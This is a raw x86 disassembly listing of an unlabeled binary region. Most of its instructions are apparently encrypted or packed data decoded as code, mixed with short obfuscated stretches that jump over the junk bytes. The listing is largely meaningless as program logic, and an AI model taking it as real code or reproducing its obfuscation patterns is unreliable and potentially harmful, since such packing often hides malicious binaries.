  4055c6:	add    al,0xc7
  4055c8:	xchg   esi,eax
  4055c9:	or     BYTE PTR ds:[si],ch
  4055cd:	add    eax,0xd01de343
  4055d2:	fs scas eax,DWORD PTR es:[edi]
  4055d4:	out    0x6,al
  4055d6:	inc    edx
  4055d7:	mov    esi,0x4dbaa18e
  4055dc:	(bad)
  4055df:	nop
  4055e0:	out    dx,al
  4055e1:	push   0xfffffff5
  4055e3:	jne    0x4055ec
  4055e5:	(bad)  
  4055e7:	mov    eax,ds:0x56353c85
  4055ec:	mov    ds:0x6028c405,al
  4055f1:	sub    al,0x42
  4055f3:	aas    
  4055f4:	push   esi
  4055f5:	sbb    DWORD PTR [ebp+0x7e],esp
  4055f8:	aad    0xfa
  4055fa:	in     eax,0xd3
  4055fc:	cli    
  4055fd:	call   0xe9ab:0x62176491
  405604:	mov    al,0xbd
  405606:	popf   
  405607:	stos   DWORD PTR es:[edi],eax
  405608:	in     eax,dx
  405609:	push   ecx
  40560a:	cmp    BYTE PTR [ecx+0x49],dl
  40560d:	dec    ecx
  40560e:	pop    ebx
  40560f:	fiadd  DWORD PTR ds:0x26d94b74
  405615:	dec    ebx
  405616:	ret    
  405617:	jmp    0x4055df
  405619:	fcom   QWORD PTR [ebx-0x376cc8b6]
  40561f:	xor    DWORD PTR [ecx-0x4c],eax
  405622:	add    ebp,ecx
  405624:	loope  0x405671
  405626:	cwde   
  405627:	add    ecx,DWORD PTR [ebp-0x5b]
  40562a:	inc    eax
  40562b:	jmp    DWORD PTR [ecx]
  40562d:	jns    0x4055f0
  40562f:	jecxz  0x405692
  405631:	(bad)  
  405632:	push   ecx
  405633:	mov    BYTE PTR [ebx+0x2b5be185],dh
  405639:	imul   BYTE PTR [ebp+eiz*4+0x36]
  40563d:	dec    ecx
  40563e:	sbb    al,0xa3
  405640:	out    dx,al
  405641:	hlt    
  405642:	sbb    al,0x6a
  405644:	mov    ds:0x4ffb204,eax
  405649:	and    eax,0x23e77ffc
  40564e:	shl    BYTE PTR [ebx+eiz*2+0x76f6a7e9],cl
  405655:	mov    ah,0x47
  405657:	sti    
  405658:	jmp    0xf06f4545
  40565d:	or     dh,BYTE PTR [edx+0x4cbeb259]
  405663:	nop
  405664:	jg     0x405668
  405666:	or     BYTE PTR [edx-0x2c],0x90
  40566a:	mov    DWORD PTR [eax+edx*8-0x4b03917e],ebx
  405671:	out    dx,al
  405672:	dec    ebx
  405673:	andps  xmm6,xmm6
  405676:	push   esi
  405677:	mov    esi,0xeb983137
  40567c:	ja     0x40567f
  40567e:	test   eax,0xf3967b32
  405683:	retf   0x1773
  405686:	sbb    DWORD PTR [ebx],edi
  405688:	fimul  WORD PTR [edi]
  40568a:	sar    BYTE PTR [ebx+0x4bc18cf0],0xdd
  405691:	push   ss
  405692:	fdivp  st(3),st
  405694:	(bad)  
  405695:	stos   DWORD PTR es:[edi],eax
  405696:	jmp    0x8075424a
  40569b:	or     eax,0xd24f1767
  4056a0:	and    BYTE PTR [ebp+0x52],bh
  4056a3:	ret    0x2d82
  4056a6:	call   0x217:0x2a1ff0f
  4056ad:	xor    BYTE PTR ds:0xfbbcef30,dl
  4056b3:	mov    cl,0xd0
  4056b5:	in     al,0xe9
  4056b7:	sbb    al,0xf7
  4056b9:	pop    ebx
  4056ba:	pop    esp
  4056bb:	jae    0x405693
  4056bd:	std    
  4056be:	loopne 0x4056a6
  4056c0:	lods   eax,DWORD PTR ds:[esi]
  4056c1:	inc    edx
  4056c2:	pusha  
  4056c3:	xchg   BYTE PTR [edi+edx*2+0x455b28f9],bh
  4056ca:	mov    cl,0xd2
  4056cc:	sub    ebp,esp
  4056ce:	adc    dh,BYTE PTR [edi-0x72bd8b33]
  4056d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056d5:	xchg   esi,eax
  4056d6:	lds    esp,FWORD PTR [edx+0x6a]
  4056d9:	xlat   BYTE PTR ds:[ebx]
  4056da:	daa    
  4056db:	cld    
  4056dc:	rol    BYTE PTR [eax-0x21],cl
  4056df:	imul   esi,DWORD PTR [ebx+0xe571afa],0x2d
  4056e6:	inc    esi
  4056e7:	fld    TBYTE PTR [ebp-0x9]
  4056ea:	sahf   
  4056eb:	jno    0x4056b8
  4056ed:	rcr    BYTE PTR ds:0xa26c9d5d,1
  4056f3:	xor    edx,DWORD PTR [edx]
  4056f5:	les    ebp,FWORD PTR [eax+0x6c]
  4056f8:	jmp    0x93e5:0x1497c03b
  4056ff:	sub    DWORD PTR [eax+ecx*4+0x10],edi
  405703:	imul   edi,DWORD PTR [esi],0x75
  405706:	data16 out 0xc1,al
  405709:	leave  
  40570a:	mov    fs,WORD PTR [eax-0x721e1143]
  405710:	xchg   edi,eax
  405711:	push   cs
  405712:	in     al,0x1c
  405714:	fdiv   QWORD PTR [eax+0x47]
  405717:	test   cl,al
  405719:	cmp    eax,0x43917992
  40571e:	lock fstp DWORD PTR [esp+ebx*4+0xc]
  405723:	mov    ?,esp
  405725:	adc    BYTE PTR [eax+esi*1+0x6535266e],0x75
  40572d:	dec    ebx
  40572e:	int3   
  40572f:	stos   BYTE PTR es:[edi],al
  405730:	fwait
  405731:	and    bh,BYTE PTR [eax+0x19f9a803]
  405737:	mov    cl,0x4b
  405739:	int3   
  40573a:	mov    eax,0x215feb0f
  40573f:	call   0xd37c:0xf6c5f25d
  405746:	ret    
  405747:	inc    eax
  405748:	push   0x77efba1c
  40574d:	retf   0xde63
  405750:	adc    dl,dl
  405752:	jns    0x405757
  405754:	mov    ebx,0xe1beccd2
  405759:	mov    ecx,0x6022e67d
  40575e:	int    0x56
  405760:	inc    edx
  405761:	ins    BYTE PTR es:[edi],dx
  405762:	pop    edx
  405763:	add    eax,0x7cc4b743
  405768:	jbe    0x405784
  40576a:	pop    esp
  40576b:	cmp    bl,BYTE PTR [esi+edi*2+0x12]
  40576f:	sbb    al,0xde
  405771:	and    BYTE PTR [edx-0x35e43a5c],al
  405777:	cs xchg bl,dl
  40577a:	in     al,0x86
  40577c:	retf   
  40577d:	adc    edi,DWORD PTR [edx]
  40577f:	pushf  
  405780:	sbb    eax,0x2c4d1ef2
  405785:	jecxz  0x40579c
  405787:	fmul   QWORD PTR [ebx+0x49]
  40578a:	adc    edi,DWORD PTR [ecx+0x71]
  40578d:	mov    edx,0x3c3015b4
  405792:	adc    al,BYTE PTR [esp+ebx*2-0x3f867fb7]
  405799:	inc    ebx
  40579a:	mov    dl,0x20
  40579c:	adc    eax,0x429e3400
  4057a1:	cwde   
  4057a2:	xchg   BYTE PTR gs:[edi-0x1f],bh
  4057a6:	scas   eax,DWORD PTR es:[edi]
  4057a7:	aam    0x43
  4057a9:	es pop es
  4057ab:	imul   ebx,DWORD PTR [edi-0x4a],0xffffffc3
  4057af:	ins    BYTE PTR es:[edi],dx
  4057b0:	arpl   bx,dx
  4057b2:	xchg   BYTE PTR [edi+eax*4-0x3e8a128],ch
  4057b9:	outs   dx,DWORD PTR ds:[esi]
  4057ba:	mov    ebx,0xa6912466
  4057bf:	or     al,dl
  4057c1:	cmp    al,0x7d
  4057c3:	pop    ss
  4057c4:	hlt    
  4057c5:	fwait
  4057c6:	std    
  4057c7:	xchg   bx,ax
  4057c9:	xchg   ebp,eax
  4057ca:	ror    BYTE PTR [edx-0x54],1
  4057cd:	(bad)  
  4057ce:	xchg   ebx,eax
  4057cf:	icebp  
  4057d0:	fwait
  4057d1:	out    0x25,eax
  4057d3:	(bad)
  4057d6:	int3   
  4057d7:	(bad)  [ebx+0x16]
  4057da:	jmp    0xa192:0xca6c3e26
  4057e1:	nop    esp
  4057e4:	add    al,bl
  4057e6:	rol    DWORD PTR [edx+0x4e],1
  4057e9:	xchg   ebx,eax
  4057ea:	xlat   BYTE PTR ds:[ebx]
  4057eb:	pop    ss
  4057ec:	push   0xffffffd4
  4057ee:	(bad)  
  4057ef:	xchg   ebx,eax
  4057f0:	jne    0x405829
  4057f2:	out    dx,al
  4057f3:	mov    ch,0xd8
  4057f5:	fbstp  TBYTE PTR [ebp+0x12]
  4057f8:	(bad)  
  4057f9:	mov    ah,0x1c
  4057fb:	aas    
  4057fc:	daa    
  4057fd:	sti    
  4057fe:	aas    
  4057ff:	xchg   esi,eax
  405800:	shl    ah,0x2d
  405803:	dec    esi
  405804:	mov    ebx,0xac52a2cd
  405809:	pop    edx
  40580a:	ja     0x4057db
  40580c:	iret   
  40580d:	mov    bh,BYTE PTR [ebp-0x71]
  405810:	aam    0x4e
  405812:	enter  0x8cf5,0xf7
  405816:	mov    dh,BYTE PTR [ebx+0x65b04494]
  40581c:	fcmove st,st(4)
  40581e:	or     BYTE PTR [ebp-0x7f],al
  405821:	test   al,0xce
  405823:	sar    BYTE PTR ds:0x2711e3e,0x8d
  40582a:	sbb    eax,0x473c260f
  40582f:	or     eax,0xb833269d
  405834:	js     0x405830
  405836:	push   eax
  405837:	mov    esi,0x568b874f
  40583c:	add    al,0xf7
  40583e:	sbb    eax,0x42834b
  405843:	mov    DWORD PTR [ebp-0x2c],ecx
  405846:	cmp    DWORD PTR ds:0x428137,0x0
  40584d:	mov    DWORD PTR ds:0x428227,0x540
  405857:	mov    ecx,0x427
  40585c:	mov    edx,0x7aa7
  405861:	jmp    0x4058af
  405866:	mov    ecx,0x6abc
  40586b:	mov    DWORD PTR ds:0x428227,0x2ac5
  405875:	cmp    DWORD PTR ds:0x428137,0x0
  40587c:	jb     0x40589d
  405882:	push   0x1050
  405887:	call   DWORD PTR ds:0x428e34
  40588d:	adc    DWORD PTR ds:0x4282cb,edx
  405893:	or     DWORD PTR ds:0x4281fb,0x369f
  40589d:	neg    DWORD PTR ds:0x42813b
  4058a3:	sub    DWORD PTR ds:0x42811b,edi
  4058a9:	sub    edx,0xfd0
  4058af:	mov    ecx,DWORD PTR [ebp+0x18]
  4058b2:	mov    edx,DWORD PTR [ebp+0x1c]
  4058b5:	shrd   ecx,edx,0x2
  4058b9:	shr    edx,0x2
  4058bc:	mov    DWORD PTR [ebp-0x1c],ecx
  4058bf:	mov    ecx,DWORD PTR [ebp+0x18]
  4058c2:	mov    edx,DWORD PTR [ebp+0x1c]
  4058c5:	xor    DWORD PTR [ebp-0x1c],edi
  4058c8:	xor    edx,edx
  4058ca:	or     edx,DWORD PTR [ebp-0x1c]
  4058cd:	shl    ecx,0x1e
  4058d0:	add    edx,DWORD PTR [ebp-0x2c]
  4058d3:	add    DWORD PTR [eax],edx
  4058d5:	mov    eax,DWORD PTR [esi]
  4058d7:	mov    ecx,DWORD PTR [esi+0x4]
  4058da:	shrd   eax,ecx,0x2
  4058de:	shr    ecx,0x2
  4058e1:	mov    ecx,DWORD PTR [esi]
  4058e3:	mov    edx,DWORD PTR [esi+0x4]
  4058e6:	xor    eax,edi
  4058e8:	shl    ecx,0x1e
  4058eb:	xor    edx,edx
  4058ed:	or     edx,eax
  4058ef:	mov    DWORD PTR [ebp-0x4],edx
  4058f2:	mov    DWORD PTR [ebp-0x30],0xca79a575
  4058f9:	mov    eax,0x9c1b89e8
  4058fe:	jmp    0x405cdc
  405903:	ret    
  405904:	scas   eax,DWORD PTR es:[edi]
  405905:	sar    ebx,0x9d
  405908:	fcmovb st,st(2)
  40590a:	scas   al,BYTE PTR es:[edi]
  40590b:	mov    dl,0xbd
  40590d:	(bad)  
  40590e:	jl     0x405939
  405910:	lods   eax,DWORD PTR ds:[esi]
  405911:	push   ecx
  405912:	jle    0x405981
  405914:	mov    cl,0x18
  405916:	sbb    BYTE PTR [esi+0x7f181812],bl
  40591c:	mov    ebp,ebp
  40591e:	div    ecx
  405920:	stos   DWORD PTR es:[edi],eax
  405921:	and    eax,esi
  405923:	or     esp,edi
  405925:	xchg   ecx,eax
  405926:	es popf 
  405928:	cmp    BYTE PTR [edx+0x1cb52839],dh
  40592e:	cmp    esi,esi
  405930:	push   0x1ae53314
  405935:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405936:	inc    eax
  405937:	xor    cl,ch
  405939:	test   al,0x29
  40593b:	ins    BYTE PTR es:[edi],dx
  40593c:	sub    dh,bh
  40593e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40593f:	loop   0x405961
  405941:	inc    edi
  405942:	idiv   ch
  405944:	loope  0x405974
  405946:	bound  esi,QWORD PTR [ecx+0x95c6de9]
  40594c:	outs   dx,DWORD PTR ds:[esi]
  40594d:	dec    edi
  40594e:	test   eax,0x34dc6953
  405953:	in     al,0xa0
  405955:	popa   
  405956:	call   ebp
  405958:	pop    ds
  405959:	xchg   esi,eax
  40595a:	xor    ecx,DWORD PTR [ebp-0xe]
  40595d:	aaa    
  40595e:	push   ss
  40595f:	push   ds
  405960:	ins    DWORD PTR es:[edi],dx
  405961:	ret    
  405962:	icebp  
  405963:	inc    edi
  405964:	xchg   ebx,eax
  405965:	imul   edx,DWORD PTR [edx],0x1900c7a8
  40596b:	jge    0x40596d
  40596d:	jns    0x40590c
  40596f:	lea    esp,[esi-0x7d]
  405972:	cli    
  405973:	sbb    BYTE PTR [ebp-0x28],bl
  405976:	scas   eax,DWORD PTR es:[edi]
  405977:	sti    
  405978:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405979:	push   ss
  40597a:	test   BYTE PTR [esi+edx*4],dl
  40597d:	pop    edx
  40597e:	(bad)  
  40597f:	mov    eax,0x81b70526
  405984:	daa    
  405985:	ret    
  405986:	cmc    
  405987:	mov    esp,edx
  405989:	call   0x33c6806
  40598e:	jae    0x405a0c
  405990:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405991:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405992:	mov    ss,edx
  405994:	sbb    eax,0x97e9be9
  405999:	dec    esi
  40599a:	fnstcw WORD PTR [ecx+0x23]
  40599d:	mov    dh,0xa4
  40599f:	dec    ebx
  4059a0:	lds    ecx,FWORD PTR [esi+0x5da374b5]
  4059a6:	pop    edx
  4059a7:	inc    ebp
  4059a8:	mov    al,ds:0xe420fe82
  4059ad:	(bad)  
  4059ae:	add    edx,DWORD PTR ds:0x568b30d0
  4059b4:	jne    0x405a1a
  4059b6:	repnz mov al,0x7
  4059b9:	jge    0x4059c9
  4059bb:	mov    ds:0x2cb9d31,al
  4059c0:	sbb    BYTE PTR [eax-0x598a5d1],ah
  4059c6:	xchg   edi,eax
  4059c7:	fist   DWORD PTR [edi+0x3b]
  4059ca:	adc    al,ah
  4059cc:	mov    DWORD PTR [edx+0x3b],0x621178c7
  4059d3:	std    
  4059d4:	cmp    ebp,DWORD PTR [edx-0x77]
  4059d7:	push   esi
  4059d8:	ja     0x4059e2
  4059da:	jl     0x40598f
  4059dc:	aam    0x4e
  4059de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059df:	mov    ebp,0x8e690055
  4059e4:	into   
  4059e5:	bound  esp,QWORD PTR [esi]
  4059e7:	xor    DWORD PTR ds:0x1c3a76ed,edi
  4059ed:	mov    WORD PTR [esi+0x6e8676f1],cs
  4059f3:	jo     0x405a03
  4059f5:	ret    
  4059f6:	jecxz  0x405a64
  4059f8:	pop    esp
  4059f9:	imul   esp,DWORD PTR [edi],0x9
  4059fc:	mov    ds:0x555973f5,eax
  405a01:	(bad)  
  405a02:	in     al,0x75
  405a04:	cmp    BYTE PTR [edi+0x4d],0x1c
  405a08:	retf   0x7cf9
  405a0b:	mov    bl,0x11
  405a0d:	inc    esp
  405a0e:	sub    BYTE PTR [esi-0x6f],cl
  405a11:	(bad)  
  405a12:	cmc    
  405a13:	and    al,0xc3
  405a15:	mov    ecx,0xb84d6ce6
  405a1a:	jae    0x4059a4
  405a1c:	jmp    0x129b25e1
  405a21:	ret    
  405a22:	mov    DWORD PTR [eax],ecx
  405a24:	dec    ebp
  405a25:	sbb    eax,0x603a891c
  405a2a:	aad    0x7e
  405a2c:	mov    ecx,DWORD PTR [eax+0x3bfe8686]
  405a32:	mov    ds:0x93ccaabb,eax
  405a37:	push   0xffffffea
  405a39:	push   ebx
  405a3a:	popf   
  405a3b:	(bad)  
  405a3c:	mov    eax,0x17719e29
  405a41:	or     ebx,esp
  405a43:	or     ebp,DWORD PTR [ebp+esi*4-0x24aa6b73]
  405a4a:	pusha  
  405a4b:	jmp    0x405a94
  405a4d:	shl    al,cl
  405a4f:	push   edi
  405a50:	pmaxub mm4,QWORD PTR [edi-0x4b802007]
  405a57:	cs js  0x405aac
  405a5a:	mov    al,ds:0x6c70cfc0
  405a5f:	es jbe 0x405a7e
  405a62:	scas   eax,DWORD PTR es:[edi]
  405a63:	xor    ah,BYTE PTR [ebp+0x145f5b32]
  405a69:	(bad)  
  405a6a:	ret    
  405a6b:	aas    
  405a6c:	shr    BYTE PTR [edx-0x3a],1
  405a6f:	cld    
  405a70:	sub    BYTE PTR [ecx-0x1c762aae],ch
  405a76:	jmp    0x405a3e
  405a78:	lods   eax,DWORD PTR ds:[esi]
  405a79:	inc    esi
  405a7a:	scas   al,BYTE PTR es:[edi]
  405a7b:	cmp    al,0x69
  405a7d:	out    0x6c,eax
  405a7f:	inc    ecx
  405a80:	out    0x8a,al
  405a82:	push   eax
  405a83:	lods   al,BYTE PTR ds:[esi]
  405a84:	test   al,0x7c
  405a86:	adc    DWORD PTR [esi-0x40b1dc06],eax
  405a8c:	sahf   
  405a8d:	cmp    BYTE PTR [ebx+eax*1+0x490d53c7],bl
  405a94:	jbe    0x405b0a
  405a96:	je     0x405a2e
  405a98:	repz mov dl,ch
  405a9b:	int3   
  405a9c:	ret    
  405a9d:	push   esp
  405a9e:	inc    esp
  405a9f:	xor    eax,0x79fb0cb6
  405aa4:	xor    eax,0x8387d1d9
  405aa9:	ficom  WORD PTR [esi]
  405aab:	ins    DWORD PTR es:[edi],dx
  405aac:	lea    ecx,[eax]
  405aae:	inc    ebx
  405aaf:	fwait
  405ab0:	ss mov ch,0xb8
  405ab3:	aad    0x3
  405ab5:	ss mov dl,0x7
  405ab8:	loopne 0x405aa5
  405aba:	icebp  
  405abb:	dec    esi
  405abc:	xor    BYTE PTR [ebp+0xa515482],ch
  405ac2:	dec    eax
  405ac3:	mov    ah,0xf6
  405ac5:	xchg   DWORD PTR [ebp-0x2341eeb7],ecx
  405acb:	pop    ss
  405acc:	xor    bl,al
  405ace:	mov    edx,0xb011ff5d
  405ad3:	push   DWORD PTR [edx+0x1a55a219]
  405ad9:	mov    fs,ebp
  405adb:	adc    BYTE PTR [esi],al
  405add:	add    BYTE PTR [edx],bl
  405adf:	mov    esi,0xc354435d
  405ae4:	push   0xffffffeb
  405ae6:	cvttps2pi mm3,QWORD PTR [ebx-0x7c]
  405aea:	(bad)  
  405aeb:	mov    ds:0x3651b67f,eax
  405af0:	clc    
  405af1:	cwde   
  405af2:	pop    ds
  405af3:	shr    BYTE PTR [ebx+0x4e],1
  405af6:	fsub   DWORD PTR [eax+0x57]
  405af9:	jbe    0x405b5e
  405afb:	retf   
  405afc:	or     bh,dh
  405afe:	dec    ecx
  405aff:	mov    cl,0xd7
  405b01:	jl     0x405b46
  405b03:	fs jno 0x405b70
  405b06:	mov    ecx,0x1c80e070
  405b0b:	repz jnp 0x405ab4
  405b0e:	lods   eax,DWORD PTR es:[esi]
  405b10:	xchg   edx,eax
  405b11:	or     ebx,DWORD PTR [ecx-0x6c]
  405b14:	hlt    
  405b15:	dec    edx
  405b16:	push   ebp
  405b17:	mov    ds:0x43bfefe,al
  405b1c:	cmc    
  405b1d:	push   edx
  405b1e:	icebp  
  405b1f:	jge    0x405ac6
  405b21:	add    BYTE PTR [ebx+0x6f8d7d80],ah
  405b27:	xchg   ecx,eax
  405b28:	pop    edi
  405b29:	hlt    
  405b2a:	(bad)  
  405b2b:	mov    ecx,0xb44da611
  405b30:	out    dx,eax
  405b31:	cmp    esi,esp
  405b33:	lods   eax,DWORD PTR ds:[esi]
  405b34:	imul   ebx,DWORD PTR [edx+0x15],0x2f
  405b38:	stc    
  405b39:	sub    DWORD PTR [eax-0x55c3738b],eax
  405b3f:	lods   eax,DWORD PTR ds:[esi]
  405b40:	sub    al,0xb6
  405b42:	and    DWORD PTR [ebx-0x57],ebp
  405b45:	mov    esp,0x90c48677
  405b4a:	xchg   edi,edi
  405b4c:	jmp    0xdfbb:0x22fbaf3
  405b53:	std    
  405b54:	mov    edi,DWORD PTR [ecx+0x1e18c489]
  405b5a:	test   eax,0xaa013d87
  405b5f:	sub    eax,ebx
  405b61:	mov    ebp,0x45ad3fc6
  405b66:	lds    eax,FWORD PTR [esi]
  405b68:	sbb    DWORD PTR [eax+0x7d0566a5],eax
  405b6e:	sub    eax,0xc75b9c21
  405b73:	lahf   
  405b74:	imul   ecx,DWORD PTR [ebx-0x2ffe49b4],0x0
  405b7b:	xlat   BYTE PTR ds:[ebx]
  405b7c:	test   dl,ch
  405b7e:	adc    ebp,DWORD PTR [ecx]
  405b80:	adc    al,dh
  405b82:	out    dx,eax
  405b83:	cmp    al,0x38
  405b85:	adc    eax,DWORD PTR [esi-0x4b]
  405b88:	cmp    eax,0x691e2ac
  405b8d:	fsubr  DWORD PTR [eax]
  405b8f:	pusha  
  405b90:	cs enter 0x3dbd,0x24
  405b95:	inc    ebx
  405b96:	mov    dl,0xc0
  405b98:	xchg   ebx,eax
  405b99:	enter  0xd04f,0x5a
  405b9d:	push   esp
  405b9e:	push   ss
  405b9f:	push   0xffffffbc
  405ba1:	sahf   
  405ba2:	and    eax,ebp
  405ba4:	rol    BYTE PTR [ebx+0x1293ad0b],cl
  405baa:	imul   eax,ebx,0xffffffa5
  405bad:	mov    ecx,DWORD PTR [ebp+0x61bf7b5c]
  405bb3:	xchg   edi,eax
  405bb4:	test   eax,0x24e90e89
  405bb9:	dec    ebx
  405bba:	jns    0x405b85
  405bbc:	stos   DWORD PTR es:[edi],eax
  405bbd:	add    BYTE PTR [esi],ch
  405bbf:	push   ebp
  405bc0:	push   ebx
  405bc1:	(bad)  
  405bc2:	sub    eax,0x8bb38dc2
  405bc7:	mov    esi,0x5abd0564
  405bcc:	cmp    al,BYTE PTR [ecx+0x6d8f1374]
  405bd2:	mov    dl,0xfd
  405bd4:	retf   
  405bd5:	xor    ebx,DWORD PTR ds:0xbd91f2d8
  405bdb:	xchg   ebp,eax
  405bdc:	loopne 0x405c2c
  405bde:	jne    0x405b67
  405be0:	push   cs
  405be1:	mov    al,ds:0xe723d176
  405be6:	out    dx,eax
  405be7:	mov    ?,WORD PTR [edi-0x69]
  405bea:	dec    ebp
  405beb:	stos   DWORD PTR es:[edi],eax
  405bec:	mov    edi,0x20a71e31
  405bf1:	arpl   WORD PTR [edi+0x6e],di
  405bf4:	push   es
  405bf5:	jmp    0x405ba9
  405bf7:	clc    
  405bf8:	mov    eax,ds:0x57a09be9
  405bfd:	xor    BYTE PTR [ebx+0x31],dh
  405c00:	mov    BYTE PTR [ebp+0x7af55e6a],0xa0
  405c07:	sub    ah,bh
  405c09:	inc    eax
  405c0a:	mov    edx,0x21c96828
  405c0f:	sbb    BYTE PTR [ebx],cl
  405c11:	icebp  
  405c12:	sbb    BYTE PTR [eax+0x15],bl
  405c15:	pop    esi
  405c16:	dec    ebp
  405c17:	leave  
  405c18:	cmp    al,0x9b
  405c1a:	pusha  
  405c1b:	out    dx,al
  405c1c:	sub    BYTE PTR [edx],0xc0
  405c1f:	call   0x42ef9067
  405c24:	popf   
  405c25:	fistp  DWORD PTR [ebp-0x38]
  405c28:	push   eax
  405c29:	ss push 0xffffff83
  405c2c:	or     eax,0xdc312a0c
  405c31:	xor    dh,BYTE PTR [edi+0x3a65f88f]
  405c37:	mov    edi,0x25d4b0a5
  405c3c:	push   ebx
  405c3d:	inc    esi
  405c3e:	jne    0x405c06
  405c40:	pop    ss
  405c41:	pop    ss
  405c42:	(bad)  
  405c43:	xor    ecx,DWORD PTR [edx]
  405c45:	rcl    DWORD PTR [ebx-0x7],0xf5
  405c49:	xor    al,0xcc
  405c4b:	cmp    bh,ah
  405c4d:	inc    esp
  405c4e:	mov    WORD PTR [ecx+0x72],fs
  405c51:	mov    bh,0x8e
  405c53:	push   esi
  405c54:	mov    bl,0x8e
  405c56:	sbb    ecx,eax
  405c58:	and    al,bh
  405c5a:	fcomp  QWORD PTR [eax+0xa]
  405c5d:	scas   eax,DWORD PTR es:[edi]
  405c5e:	mov    ch,BYTE PTR [ebx+0x553e21c4]
  405c64:	sub    eax,esp
  405c66:	not    DWORD PTR [ebx]
  405c68:	out    0x2e,eax
  405c6a:	mov    edx,0x6ebf9da
  405c6f:	and    esp,DWORD PTR [ecx-0x3eec2c4c]
  405c75:	mov    WORD PTR [edx+esi*8-0x1c71364f],ds
  405c7c:	lahf   
  405c7d:	mov    BYTE PTR [ebp+0x2e],ch
  405c80:	sub    DWORD PTR [esi],edi
  405c82:	mov    bh,0x5f
  405c84:	xchg   edx,eax
  405c85:	daa    
  405c86:	xchg   esi,eax
  405c88:	jg     0x405c8d
  405c8a:	add    DWORD PTR [esi],ebx
  405c8c:	sub    ch,BYTE PTR [edx]
  405c8e:	mov    ebx,0x41390b80
  405c93:	mov    ds:0x51a6df11,al
  405c98:	cli    
  405c99:	xchg   edi,eax
  405c9a:	mov    ds:0x928cd1d9,eax
  405c9f:	pop    esp
  405ca0:	into   
  405ca1:	mov    ebx,0xee500401
  405ca6:	je     0x405d17
  405ca8:	sub    eax,DWORD PTR [ebx-0x30e10b81]
  405cae:	mov    edi,0x669cfd79
  405cb3:	push   es
  405cb4:	pop    ebx
  405cb5:	push   ebp
  405cb6:	sub    ch,BYTE PTR [ebp+0x1]
  405cb9:	jle    0x405ce4
  405cbb:	cmp    BYTE PTR [edi+0x71bec570],ah
  405cc1:	out    0x57,al
  405cc3:	fild   DWORD PTR [eax+0x16]
  405cc6:	hlt    
  405cc7:	add    al,0xbe
  405cc9:	push   ss
  405cca:	arpl   dx,cx
  405ccc:	(bad)  
  405cce:	test   BYTE PTR [esi+0x5175f071],bh
  405cd4:	outs   dx,BYTE PTR ds:[esi]
  405cd5:	(bad)  
  405cd6:	adc    eax,0xcee63852
  405cdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405cdc:	mov    DWORD PTR [ebp-0x2c],eax
  405cdf:	mov    DWORD PTR [ebp-0x20],0xca79a571
  405ce6:	mov    DWORD PTR [ebp-0x1c],eax
  405ce9:	mov    DWORD PTR [ebp-0x10],0xca79a57d
  405cf0:	mov    DWORD PTR [ebp-0xc],eax
  405cf3:	mov    DWORD PTR [ebp-0x60],0xca79a579
  405cfa:	mov    DWORD PTR [ebp-0x5c],eax
  405cfd:	mov    eax,DWORD PTR [ebp-0x30]
  405d00:	mov    ecx,DWORD PTR [ebp-0x2c]
  405d03:	shrd   eax,ecx,0x2
  405d07:	shr    ecx,0x2
  405d0a:	mov    ecx,DWORD PTR [ebp-0x30]
  405d0d:	mov    edx,DWORD PTR [ebp-0x2c]
  405d10:	xor    eax,edi
  405d12:	shl    ecx,0x1e
  405d15:	xor    edx,edx
  405d17:	or     eax,edx
  405d19:	jmp    0x4060f7
  405d1e:	cmp    ebp,DWORD PTR [ecx+0x3e]
  405d21:	lock sbb ch,BYTE PTR [esi+0x62d8231a]
  405d28:	shl    DWORD PTR [eax+0x12],1
  405d2b:	fmul   DWORD PTR [ecx+0x18a9f27c]
  405d31:	sbb    BYTE PTR [esi-0x29e7e7ee],bl
  405d37:	fst    st(1)
  405d39:	ficomp WORD PTR [esi]
  405d3b:	mov    eax,0xf7911a36
  405d40:	inc    ebx
  405d41:	shl    DWORD PTR [esi-0x58a9b2d9],0x87
  405d48:	xor    al,0x9d
  405d4b:	mov    edi,0x470533c
  405d50:	push   edi
  405d51:	ret    
  405d52:	ds mov DWORD PTR es:[edx],ecx
  405d56:	fs push edi
  405d58:	jnp    0x405d8e
  405d5a:	adc    ch,dl
  405d5c:	test   ah,ah
  405d5e:	sbb    al,0xb2
  405d60:	jne    0x405dad
  405d62:	inc    edi
  405d63:	sbb    ebp,DWORD PTR [esi-0x12]
  405d66:	pop    esp
  405d67:	push   ecx
  405d68:	inc    edx
  405d69:	pop    edi
  405d6a:	mov    bh,0x46
  405d6c:	adc    al,0xb0
  405d6e:	xchg   ecx,eax
  405d6f:	aad    0xb0
  405d71:	mov    ch,0xfc
  405d73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d74:	bound  esi,QWORD PTR [ebx-0x71]
  405d77:	test   BYTE PTR [ebx+edx*1],ch
  405d7a:	addr16 fs push esp
  405d7d:	pop    ss
  405d7e:	add    eax,0x50c731
  405d83:	or     BYTE PTR [eax-0x14],dl
  405d86:	mov    bl,0x2b
  405d88:	push   edx
  405d89:	scas   al,BYTE PTR es:[edi]
  405d8a:	jbe    0x405dd9
  405d8c:	fmul   QWORD PTR [ebx+0x5b0c3675]
  405d92:	xchg   esp,eax
  405d93:	shr    cl,cl
  405d95:	sbb    BYTE PTR [ecx],0x33
  405d98:	popf   
  405d99:	idiv   bl
  405d9b:	or     cl,ah
  405d9d:	das    
  405d9e:	repz push ds
  405da0:	iret   
  405da1:	ins    DWORD PTR es:[edi],dx
  405da2:	or     BYTE PTR [edi+edx*2],al
  405da5:	mov    al,bl
  405da7:	test   dh,ah
  405da9:	out    0xf5,al
  405dab:	or     bl,BYTE PTR [ecx+0x80623fc]
  405db1:	(bad)  
  405db2:	out    dx,al
  405db3:	xchg   ebp,eax
  405db4:	push   ebx
  405db5:	es jge 0x405d80
  405db8:	xchg   DWORD PTR [ecx],ecx
  405dba:	jb     0x405db2
  405dbc:	repnz loop 0x405d4f
  405dbf:	mov    al,0x9d
  405dc1:	test   eax,0x99709bf8
  405dc6:	mov    ah,0x54
  405dc8:	jo     0x405d97
  405dca:	cli    
  405dcb:	add    al,0x69
  405dcd:	jle    0x405e19
